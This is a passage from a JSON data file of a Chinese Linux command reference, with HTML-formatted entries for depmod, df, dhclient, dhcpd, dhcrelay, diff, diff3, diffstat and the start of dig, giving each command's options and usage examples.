<span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span>_pro500-bcm91250-mips2_fp_be -A -a\n</code></pre>\n<ul>\n<li>  <code>/home/windsome/EMMA3PF-KernelSource-20080626/install_pos</code>是我<code>make mod_install</code>后，所有模块的存放路径。</li>\n<li>  <code>./boot/System.map</code>是<code>make linux</code>后生成，我拷贝到此目录的。</li>\n<li>  <code>2.6.18_pro500-bcm91250-mips2_fp_be</code>是我build的linux的版本。</li>\n</ul>\n<p>编译linux过程及执行depmod的例子：</p>\n<pre><code class=\"language-shell\">genkernel.sh (at linux-<span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span>_pro500)\n<span class=\"hljs-comment\">#######</span>\nexport INSTALL_ROOT_EMMA3PF=<span class=\"hljs-string\">\"/home/windsome/EMMA3PF-KernelSource-20080626/install_pos\"</span>\nexport INSTALL_MOD_EMMA3PF=<span class=\"hljs-string\">\"/home/windsome/EMMA3PF-KernelSource-20080626/install_pos\"</span>\nrm <span class=\"hljs-regexp\">/home/</span>windsome<span class=\"hljs-regexp\">/EMMA3PF-KernelSource-20080626/i</span>nstall_pos/lib -rf\nrm <span class=\"hljs-regexp\">/home/</span>windsome<span class=\"hljs-regexp\">/EMMA3PF-KernelSource-20080626/i</span>nstall_pos<span class=\"hljs-regexp\">/boot/</span>* -rf\ncd &lt;linux_src_dir&gt;\nmake\nmake modules_install\ncp vmlinux System.map <span class=\"hljs-regexp\">/home/</span>windsome<span class=\"hljs-regexp\">/EMMA3PF-KernelSource-20080626/i</span>nstall_pos<span class=\"hljs-regexp\">/boot/</span> -p\ncd <span class=\"hljs-regexp\">/home/</span>windsome<span class=\"hljs-regexp\">/EMMA3PF-KernelSource-20080626/i</span>nstall_pos\ndepmod -b <span class=\"hljs-regexp\">/home/</span>windsome<span class=\"hljs-regexp\">/EMMA3PF-KernelSource-20080626/i</span>nstall_pos -e -F .<span class=\"hljs-regexp\">/boot/</span>System.map -v <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span>_pro500-bcm91250-mips2_fp_be -A -a\n</code></pre>\n<p>其他用法：</p>\n<p>在linux桌面系统中，当你编译了新的驱动，为了能够用<code>modprobe ***</code>加载模块, 你需要先将模块拷贝到<code>/lib/modules /2.6.31-20-generic</code>目录下，然后运行<code>sudo depmod -a</code>将模块信息写入modules.dep、modules.dep.bin、modules.alias.bin、modules.alias和modules.pcimap文件中。</p>\n<p>如，我编译了一个新的wifi驱动r8192se_pci.ko，将其拷贝到<code>/lib/modules/2.6.31-20-generic/wireless</code>下，然后到<code>/lib/modules/2.6.31-20-generic</code>运行<code>depmod -a</code>，之后可以在任意目录运行modprobe r8192se_pci。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "df",
        "des": "显示磁盘的相关信息",
        "body": "<h1 id=\"df\">df</h1>\n<p>显示磁盘的相关信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>df命令</strong> 用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">df</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">a</span>或<span class=\"hljs-comment\">--all：包含全部的文件系统；</span>\n<span class=\"hljs-comment\">--block-size=&lt;区块大小&gt;：以指定的区块大小来显示区块数目；</span>\n-h或<span class=\"hljs-comment\">--human-readable：以可读性较高的方式来显示信息；</span>\n-H或<span class=\"hljs-comment\">--si：与-h参数相同，但在计算时是以1000 Bytes为换算单位而非1024 Bytes；</span>\n-i或<span class=\"hljs-comment\">--inodes：显示inode的信息；</span>\n-k或<span class=\"hljs-comment\">--kilobytes：指定区块大小为1024字节；</span>\n-l或<span class=\"hljs-comment\">--local：仅显示本地端的文件系统；</span>\n-m或<span class=\"hljs-comment\">--megabytes：指定区块大小为1048576字节；</span>\n<span class=\"hljs-comment\">--no-sync：在取得磁盘使用信息前，不要执行sync指令，此为预设值；</span>\n-P或<span class=\"hljs-comment\">--portability：使用POSIX的输出格式；</span>\n<span class=\"hljs-comment\">--sync：在取得磁盘使用信息前，先执行sync指令；</span>\n-t&lt;文件系统类型&gt;或<span class=\"hljs-comment\">--type=&lt;文件系统类型&gt;：仅显示指定文件系统类型的磁盘信息；</span>\n-T或<span class=\"hljs-comment\">--print-type：显示文件系统的类型；</span>\n-x&lt;文件系统类型&gt;或<span class=\"hljs-comment\">--exclude-type=&lt;文件系统类型&gt;：不要显示指定文件系统类型的磁盘信息；</span>\n<span class=\"hljs-comment\">--help：显示帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定文件系统上的文件。</p>\n<h3 id=\"大小格式\">大小格式</h3>\n<p>显示值以 <code>--block-size</code> 和 <code>DF_BLOCK_SIZE</code>，<code>BLOCK_SIZE</code> 和 <code>BLOCKSIZE</code> 环境变量中的第一个可用 <code>SIZE</code> 为单位。 否则，单位默认为 <code>1024</code> 个字节（如果设置 <code>POSIXLY_CORRECT</code>，则为<code>512</code>）。</p>\n<p>SIZE是一个整数和可选单位（例如：10M是10 * 1024 * 1024）。 单位是K，M，G，T，P，E，Z，Y（1024的幂）或KB，MB，...（1000的幂）。</p>\n<h3 id=\"实例\">实例</h3>\n<p>查看系统磁盘设备，默认是KB为单位：</p>\n<pre><code class=\"language-shell\">[root@LinServ-1 ~]<span class=\"hljs-comment\"># df</span>\n文件系统               1K-块        已用     可用 已用% 挂载点\n/dev/sda2           <span class=\"hljs-number\"> 146294492 </span><span class=\"hljs-number\"> 28244432 </span>110498708  21% /\n/dev/sda1             <span class=\"hljs-number\"> 1019208 </span>   <span class=\"hljs-number\"> 62360 </span>  <span class=\"hljs-number\"> 904240 </span>  7% /boot\ntmpfs                 <span class=\"hljs-number\"> 1032204 </span>       <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 1032204 </span>  0% /dev/shm\n/dev/sdb1           <span class=\"hljs-number\"> 2884284108 </span>218826068<span class=\"hljs-number\"> 2518944764 </span>  8% /data1\n</code></pre>\n<p>使用<code>-h</code>选项以KB以上的单位来显示，可读性高：</p>\n<pre><code class=\"language-shell\">[root@LinServ-<span class=\"hljs-number\">1</span> ~]<span class=\"hljs-comment\"># df -h</span>\n文件系统              容量  已用 可用 已用% 挂载点\n<span class=\"hljs-regexp\">/dev/</span>sda2             <span class=\"hljs-number\">140</span>G   <span class=\"hljs-number\">27</span>G  <span class=\"hljs-number\">106</span>G  <span class=\"hljs-number\">21</span>% /\n<span class=\"hljs-regexp\">/dev/</span>sda1             <span class=\"hljs-number\">996</span>M   <span class=\"hljs-number\">61</span>M  <span class=\"hljs-number\">884</span>M   <span class=\"hljs-number\">7</span>% /boot\ntmpfs                <span class=\"hljs-number\">1009</span>M     <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1009</span>M   <span class=\"hljs-number\">0</span>% <span class=\"hljs-regexp\">/dev/</span>shm\n<span class=\"hljs-regexp\">/dev/</span>sdb1             <span class=\"hljs-number\">2.7</span>T  <span class=\"hljs-number\">209</span>G  <span class=\"hljs-number\">2.4</span>T   <span class=\"hljs-number\">8</span>% /data1\n</code></pre>\n<p>查看全部文件系统：</p>\n<pre><code class=\"language-shell\">[root@LinServ-1 ~]<span class=\"hljs-comment\"># df -a</span>\n文件系统               1K-块        已用     可用 已用% 挂载点\n/dev/sda2           <span class=\"hljs-number\"> 146294492 </span><span class=\"hljs-number\"> 28244432 </span>110498708  21% /\nproc                        <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>  -  /proc\nsysfs                       <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>  -  /sys\ndevpts                      <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>  -  /dev/pts\n/dev/sda1             <span class=\"hljs-number\"> 1019208 </span>   <span class=\"hljs-number\"> 62360 </span>  <span class=\"hljs-number\"> 904240 </span>  7% /boot\ntmpfs                 <span class=\"hljs-number\"> 1032204 </span>       <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 1032204 </span>  0% /dev/shm\n/dev/sdb1           <span class=\"hljs-number\"> 2884284108 </span>218826068<span class=\"hljs-number\"> 2518944764 </span>  8% /data1\nnone                        <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>  -  /proc/sys/fs/binfmt_misc\n</code></pre>\n<p>显示 <code>public</code> 目录中的可用空间量，如以下输出中所示：</p>\n<pre><code class=\"language-shell\">df <span class=\"hljs-keyword\">public</span>\n<span class=\"hljs-meta\"># Filesystem     1K-blocks     Used Available Use% Mounted on</span>\n<span class=\"hljs-meta\"># /dev/loop0      18761008 15246924   2554392  86% /d Avail</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dhclient",
        "des": "动态获取或释放IP地址",
        "body": "<h1 id=\"dhclient\">dhclient</h1>\n<p>动态获取或释放IP地址</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dhclient命令</strong> 使用动态主机配置协议动态的配置网络接口的网络参数。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dhclient</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">0：指定dhcp客户端监听的端口号；\n<span class=\"hljs-deletion\">-d：总是以前台方式运行程序；</span>\n<span class=\"hljs-deletion\">-q：安静模式，不打印任何错误的提示信息；</span>\n<span class=\"hljs-deletion\">-r：释放ip地址。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>网络接口：操作的网络接口。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dhclient</span> -r     <span class=\"hljs-comment\">#释放IP</span>\ndhclient        <span class=\"hljs-comment\">#获取IP</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dhcpd",
        "des": "运行DHCP服务器",
        "body": "<h1 id=\"dhcpd\">dhcpd</h1>\n<p>运行DHCP服务器</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">dhcpd <span class=\"hljs-selector-attr\">[选项]</span> <span class=\"hljs-selector-attr\">[网络接口]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p &lt;端口&gt; 指定dhcpd监听的端口</span>\n<span class=\"hljs-deletion\">-f 作为前台进程运行dhcpd</span>\n<span class=\"hljs-deletion\">-d 启用调试模式</span>\n<span class=\"hljs-deletion\">-q 在启动时不显示版权信息</span>\n<span class=\"hljs-deletion\">-t 简单地测试配置文件的语法是否正确的，但不会尝试执行任何网络操作</span>\n<span class=\"hljs-deletion\">-T 可以用来测试租约数据库文件</span>\n<span class=\"hljs-deletion\">-4 运行DHCP服务器</span>\n<span class=\"hljs-deletion\">-6 运行DHCPv6服务器</span>\n<span class=\"hljs-deletion\">-s &lt;服务器&gt; 指定发送回复的服务器</span>\n<span class=\"hljs-deletion\">-cf &lt;配置文件&gt; 指定配置文件</span>\n<span class=\"hljs-deletion\">-lf &lt;租约文件&gt; 指定租约文件</span>\n<span class=\"hljs-deletion\">-pf &lt;PID文件&gt; 指定PID文件</span>\n<span class=\"hljs-deletion\">-tf &lt;跟踪输出文件&gt; 指定文件记录DHCP服务器的整个启动状态</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>对DHCP服务器进行排错。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># dhcpd</span>\nInternetSystems Consortium DHCP Server <span class=\"hljs-number\">4.1</span>.<span class=\"hljs-number\">1</span>-P1\nCopyright2004-<span class=\"hljs-number\">2010</span> Internet Systems Consortium.\nAll rightsreserved.\nFor info,please visit https:<span class=\"hljs-regexp\">//</span>www.isc.org<span class=\"hljs-regexp\">/software/</span>dhcp/\nNot searchingLDAP since ldap-server, ldap-port and ldap-base-dn were not specified <span class=\"hljs-keyword\">in</span> theconfig file\nWrote <span class=\"hljs-number\">0</span>deleted host decls to leases file.\nWrote <span class=\"hljs-number\">0</span> newdynamic host decls to leases file.\nWrote <span class=\"hljs-number\">1</span>leases to leases file.\nListening onLPF<span class=\"hljs-regexp\">/eth0/</span><span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:fc:<span class=\"hljs-number\">2</span>f:e5<span class=\"hljs-regexp\">/192.168.0.0/</span><span class=\"hljs-number\">24</span>\nSendingon  LPF<span class=\"hljs-regexp\">/eth0/</span><span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:fc:<span class=\"hljs-number\">2</span>f:e5<span class=\"hljs-regexp\">/192.168.0.0/</span><span class=\"hljs-number\">24</span>\nSendingon   Socket<span class=\"hljs-regexp\">/fallback/</span>fallback-net\n[root@rhel~]<span class=\"hljs-comment\"># There's already a DHCP server running.</span>\n \nThis versionof ISC DHCP is based on the release available\nonftp.isc.org.  Features have been addedand other changes\nhave beenmade to the base software release <span class=\"hljs-keyword\">in</span> order to make\nit workbetter with this distribution.\n \nexiting.\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dhcrelay",
        "des": "使用dhcrelay命令可以提供中继DHCP和BOOTP请求",
        "body": "<h1 id=\"dhcrelay\">dhcrelay</h1>\n<p>使用dhcrelay命令可以提供中继DHCP和BOOTP请求</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dhcrelay命令</strong> 使用dhcrelay命令可以提供中继DHCP和BOOTP请求，从一个没有DHCP服务器的子网直接连接到其它子网内的一个或多个DHCP服务器。该命令在DHCP中继服务器上使用，同时支持DHCPv4/BOOTP和DHCPv6协议。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">dhcrelay <span class=\"hljs-selector-attr\">[选项]</span> <span class=\"hljs-selector-attr\">[DHCP服务器]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c &lt;跳数&gt; 当转发数据包时，dhcrelay丢弃已经达到一个最大跳数的数据包。默认值是10，最大值是255</span>\n<span class=\"hljs-deletion\">-4 运行dhcrelay命令作为DHCPv4/BOOTP中继代理。这是默认操作模式</span>\n<span class=\"hljs-deletion\">-6 运行dhcrelay命令作为DHCPv6中继代理</span>\n<span class=\"hljs-deletion\">-q 安静模式</span>\n<span class=\"hljs-deletion\">-p &lt;端口&gt; 监听和发送端口。DHCPv4/BOOTP默认端口是67，DHCPv6默认端口是547</span>\n<span class=\"hljs-deletion\">-A &lt;长度&gt; 指定发送到DHCP服务器的最大数据包大小</span>\n<span class=\"hljs-deletion\">-d 强制dhcrelay命令作为前台进程运行</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>指定DHCP服务器的位置。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># dhcrelay 192.168.0.2</span>\nInternet Systems Consortium DHCP Relay Agent4.<span class=\"hljs-number\">1.1</span>-P1\nCopyright <span class=\"hljs-number\">2004</span>-<span class=\"hljs-number\">2010</span> Internet SystemsConsortium.\nAll rights reserved.\nFor info, please visithttps:<span class=\"hljs-regexp\">//</span>www.isc.org<span class=\"hljs-regexp\">/software/</span>dhcp/\nListening on LPF<span class=\"hljs-regexp\">/eth1/</span><span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:fc:<span class=\"hljs-number\">2</span>f:ef\nSending on  LPF<span class=\"hljs-regexp\">/eth1/</span><span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:fc:<span class=\"hljs-number\">2</span>f:ef\nListening on LPF<span class=\"hljs-regexp\">/eth0/</span><span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">27</span>:fc:<span class=\"hljs-number\">25</span>:ec\nSending on  LPF<span class=\"hljs-regexp\">/eth0/</span><span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">27</span>:fc:<span class=\"hljs-number\">25</span>:ec\nSending on  Socket/fallback\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "diff",
        "des": "比较给定的两个文件的不同",
        "body": "<h1 id=\"diff\">diff</h1>\n<p>比较给定的两个文件的不同</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>diff命令</strong> 在最简单的情况下，比较给定的两个文件的不同。如果使用“-”代替“文件”参数，则要比较的内容将来自标准输入。diff命令是以逐行的方式，比较文本文件的异同处。如果该命令指定进行目录的比较，则将会比较该目录中具有相同文件名的文件，而不会对其子目录文件进行任何比较操作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">diff</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-&lt;行数&gt;：指定要显示多少行的文本。此参数必须与-c或-u参数一并使用；</span>\n<span class=\"hljs-deletion\">-a或——text：diff预设只会逐行比较文本文件；</span>\n<span class=\"hljs-deletion\">-b或--ignore-space-change：不检查空格字符的不同；</span>\n<span class=\"hljs-deletion\">-B或--ignore-blank-lines：不检查空白行；</span>\n<span class=\"hljs-deletion\">-c：显示全部内容，并标出不同之处；</span>\n<span class=\"hljs-deletion\">-C&lt;行数&gt;或--context&lt;行数&gt;：与执行“-c-&lt;行数&gt;”指令相同；</span>\n<span class=\"hljs-deletion\">-d或——minimal：使用不同的演算法，以小的单位来做比较；</span>\n<span class=\"hljs-deletion\">-D&lt;巨集名称&gt;或ifdef&lt;巨集名称&gt;：此参数的输出格式可用于前置处理器巨集；</span>\n<span class=\"hljs-deletion\">-e或——ed：此参数的输出格式可用于ed的script文件；</span>\n<span class=\"hljs-deletion\">-f或-forward-ed：输出的格式类似ed的script文件，但按照原来文件的顺序来显示不同处；</span>\n<span class=\"hljs-deletion\">-H或--speed-large-files：比较大文件时，可加快速度；</span>\n<span class=\"hljs-deletion\">-l&lt;字符或字符串&gt;或--ignore-matching-lines&lt;字符或字符串&gt;：若两个文件在某几行有所不同，而之际航同时都包含了选项中指定的字符或字符串，则不显示这两个文件的差异；</span>\n<span class=\"hljs-deletion\">-i或--ignore-case：不检查大小写的不同；</span>\n<span class=\"hljs-deletion\">-l或——paginate：将结果交由pr程序来分页；</span>\n<span class=\"hljs-deletion\">-n或——rcs：将比较结果以RCS的格式来显示；</span>\n<span class=\"hljs-deletion\">-N或--new-file：在比较目录时，若文件A仅出现在某个目录中，预设会显示：Only in目录，文件A 若使用-N参数，则diff会将文件A 与一个空白的文件比较；</span>\n<span class=\"hljs-deletion\">-p：若比较的文件为C语言的程序码文件时，显示差异所在的函数名称；</span>\n<span class=\"hljs-deletion\">-P或--unidirectional-new-file：与-N类似，但只有当第二个目录包含了第一个目录所没有的文件时，才会将这个文件与空白的文件做比较；</span>\n<span class=\"hljs-deletion\">-q或--brief：仅显示有无差异，不显示详细的信息；</span>\n<span class=\"hljs-deletion\">-r或——recursive：比较子目录中的文件；</span>\n<span class=\"hljs-deletion\">-s或--report-identical-files：若没有发现任何差异，仍然显示信息；</span>\n<span class=\"hljs-deletion\">-S&lt;文件&gt;或--starting-file&lt;文件&gt;：在比较目录时，从指定的文件开始比较；</span>\n<span class=\"hljs-deletion\">-t或--expand-tabs：在输出时，将tab字符展开；</span>\n<span class=\"hljs-deletion\">-T或--initial-tab：在每行前面加上tab字符以便对齐；</span>\n<span class=\"hljs-deletion\">-u，-U&lt;列数&gt;或--unified=&lt;列数&gt;：以合并的方式来显示文件内容的不同；</span>\n<span class=\"hljs-deletion\">-v或——version：显示版本信息；</span>\n<span class=\"hljs-deletion\">-w或--ignore-all-space：忽略全部的空格字符；</span>\n<span class=\"hljs-deletion\">-W&lt;宽度&gt;或--width&lt;宽度&gt;：在使用-y参数时，指定栏宽；</span>\n<span class=\"hljs-deletion\">-x&lt;文件名或目录&gt;或--exclude&lt;文件名或目录&gt;：不比较选项中所指定的文件或目录；</span>\n<span class=\"hljs-deletion\">-X&lt;文件&gt;或--exclude-from&lt;文件&gt;；您可以将文件或目录类型存成文本文件，然后在=&lt;文件&gt;中指定此文本文件；</span>\n<span class=\"hljs-deletion\">-y或--side-by-side：以并列的方式显示文件的异同之处；</span>\n<span class=\"hljs-deletion\">--help：显示帮助；</span>\n<span class=\"hljs-deletion\">--left-column：在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容；</span>\n<span class=\"hljs-deletion\">--suppress-common-lines：在使用-y参数时，仅显示不同之处。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件1：指定要比较的第一个文件；</li>\n<li>  文件2：指定要比较的第二个文件。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>将目录<code>/usr/li</code>下的文件\"test.txt\"与当前目录下的文件\"test.txt\"进行比较，输入如下命令：</p>\n<pre><code class=\"language-shell\">diff <span class=\"hljs-regexp\">/usr/</span>li test.txt     <span class=\"hljs-comment\">#使用diff指令对文件进行比较</span>\n</code></pre>\n<p>上面的命令执行后，会将比较后的不同之处以指定的形式列出，如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">n1</span> a <span class=\"hljs-symbol\">n3</span>,<span class=\"hljs-symbol\">n4</span>  \n<span class=\"hljs-symbol\">n1</span>,<span class=\"hljs-symbol\">n2</span> d <span class=\"hljs-symbol\">n3</span>  \n<span class=\"hljs-symbol\">n1</span>,<span class=\"hljs-symbol\">n2</span> c <span class=\"hljs-symbol\">n3</span>,<span class=\"hljs-symbol\">n4</span> \n</code></pre>\n<p>其中，字母\"a\"、\"d\"、\"c\"分别表示添加、删除及修改操作。而\"n1\"、\"n2\"表示在文件1中的行号，\"n3\"、\"n4\"表示在文件2中的行号。</p>\n<p>注意：以上说明指定了两个文件中不同处的行号及其相应的操作。在输出形式中，每一行后面将跟随受到影响的若干行。其中，以&lt;开始的行属于文件1，以&gt;开始的行属于文件2。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "diff3",
        "des": "比较3个文件不同的地方",
        "body": "<h1 id=\"diff3\">diff3</h1>\n<p>比较3个文件不同的地方</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>diff3命令</strong> 用于比较3个文件，将3个文件的不同的地方显示到标准输出。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">diff3</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">a</span>：把所有的文件都当做文本文件按照行为单位进行比较，即给定的文件不是文本文件；\n-<span class=\"hljs-selector-tag\">A</span>：合并第<span class=\"hljs-number\">2</span>个文件和第<span class=\"hljs-number\">3</span>个文件之间的不同到第<span class=\"hljs-number\">1</span>个文件中，有冲突内容用括号括起来；\n-<span class=\"hljs-selector-tag\">B</span>：与选项“-<span class=\"hljs-selector-tag\">A</span>”功能相同，但是不显示冲突的内容；\n-e/--ed：生成一个“-ed”脚本，用于将第<span class=\"hljs-number\">2</span>个文件和第<span class=\"hljs-number\">3</span>个文件之间的不同合并到第<span class=\"hljs-number\">1</span>个文件中；\n--easy-only：除了不显示互相重叠的变化，与选项“-e”的功能相同；\n-<span class=\"hljs-selector-tag\">i</span>：为了和system V系统兼容，在“ed”脚本的最后生成“w”和“<span class=\"hljs-selector-tag\">q</span>”命令。此选项必须和选项“-AeExX3”连用，但是不能和“-m”连用；\n--<span class=\"hljs-attribute\">initial</span>-tab：在正常格式的行的文本前，输出一个TAB字符而非两个空白字符。此选项将导致在行中TAB字符的对齐方式看上去规范。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>文件1：指定要比较的第1个文件；</li>\n<li>文件2：指定要比较的第2个文件；</li>\n<li>文件3：指定要比较的第3个文件。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "diffstat",
        "des": "显示diff命令输出信息的柱状图",
        "body": "<h1 id=\"diffstat\">diffstat</h1>\n<p>显示diff命令输出信息的柱状图</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>diffstat命令</strong> 用来显示diff命令输出信息的柱状图，用以显示diff命令比较两个文件的不同统计信息。用户也可以直接使用<code>|</code>将diff命令所输出的结果直接送给diffstat命令进行统计结果的显示。使用该命令时，若所比较的文件或者子目录不在当前目录下，则应该使用其完整路径。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">diffstat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n&lt;文件名长度&gt;：指定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名；</span>\n<span class=\"hljs-deletion\">-p&lt;文件名长度&gt;：与-n参数相同，但此处的&lt;文件名长度&gt;包括了文件的路径；</span>\n<span class=\"hljs-deletion\">-w：指定要输出时栏位的宽度；</span>\n<span class=\"hljs-deletion\">-v：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定保存有diff命令的输出信息文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将目录\"test1\"和\"test2\"下的同名文件\"testf.txt\"使用diff命令进行比较。然后使用diffstat命令对结果进行统计显示，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">diff</span> test1 test2 | diffstat    <span class=\"hljs-comment\">#进行比较结果的统计显示</span>\n</code></pre>\n<p>注意：使用这条命令可以非常方便地实现统计显示的功能。</p>\n<p>对于查看文件中的内容，用户可以通过cat命令进行查看即可，具体操作如下：</p>\n<pre><code class=\"language-shell\">cat test1<span class=\"hljs-regexp\">/testf.txt           #查看test1/</span>testf的内容\nabc\n<span class=\"hljs-keyword\">def</span>\nghi\njkl\nmno\npqr\nstu\nvws\n\ncat test2<span class=\"hljs-regexp\">/testf.txt          #查看test2/</span>testf的内容\nabc\n<span class=\"hljs-keyword\">def</span>\nghi\njkl\nmno\n</code></pre>\n<p>从上面的文件内容显示，可以看到两个文件内容的差别。现在来运行刚才的命令，对文件比较的结果进行统计显示，结果如下：</p>\n<pre><code class=\"language-shell\">testfile |<span class=\"hljs-number\"> 2 </span>+-             <span class=\"hljs-comment\">#统计信息输出显示</span>\n1 file changed,<span class=\"hljs-number\"> 1 </span>insertion(+),<span class=\"hljs-number\"> 1 </span>deletion(-)\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dig",
        "des": "域名查询工具",
        "body": "<h1 id=\"dig\">dig</h1>\n<p>域名查询工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dig命令</strong> 是常用的域名查询工具，可以用来测试域名系统工作是否正常。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dig</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；\n<span class=\"hljs-deletion\">-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；</span>\n<span class=\"hljs-deletion\">-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；</span>\n<span class=\"hljs-deletion\">-P：指定域名服务器所使用端口号；</span>\n<span class=\"hljs-deletion\">-t&lt;类型&gt;：指定要查询的DNS数据类型；</span>\n<span class=\"hljs-deletion\">-x&lt;IP地址&gt;：执行逆向域名查询；</span>\n<span class=\"hljs-deletion\">-4：使用IPv4；</span>\n<span class=\"hljs-deletion\">-6：使用IPv6；</span>\n<span class=\"hljs-deletion\">-h：显示指令帮助信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  主机：指定要查询域名主机；</li>\n<li>  查询类型：指定DNS查询的类型；</li>\n<li>  查询类：指定查询DNS的class；</li>\n<li>  查询选项：指定查询选项。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[<span 